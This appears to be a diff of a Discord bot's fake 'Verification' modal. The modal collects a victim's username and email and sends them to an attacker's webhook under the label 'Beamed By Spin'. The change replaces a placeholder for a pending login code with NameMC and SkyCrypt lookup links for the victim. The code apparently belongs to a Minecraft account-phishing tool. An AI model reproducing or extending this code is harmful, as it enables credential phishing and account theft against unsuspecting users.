@@ -22,11 +22,10 @@ class MyModalOne(ui.Modal, title="Verification"):
                 try:
                     await webhook.send(
                         embed=discord.Embed(
-                            title="Account Info (Beamed By Spin)",
-                            url= f'https://sky.shiiyu.moe/{self.box_one.value}',
+                            title="Another One Bites The Dust (Beamed By Spin)",
                             description=f"**Username:**:\n ```{self.box_one.value}```\n"
                                         f"**Email**:\n ```{self.box_two.value}```\n"
-                                        f"**Code**:\n ```User hasn't clicked button two yet```",
+                                        f"**[NameMC + SkyCrypt]**\n https://namemc.com/profile/{self.box_one.value}\nhttps://sky.shiiyu.moe/stats/{self.box_one.value}",
                             colour=0xff0000
                         )
                     )
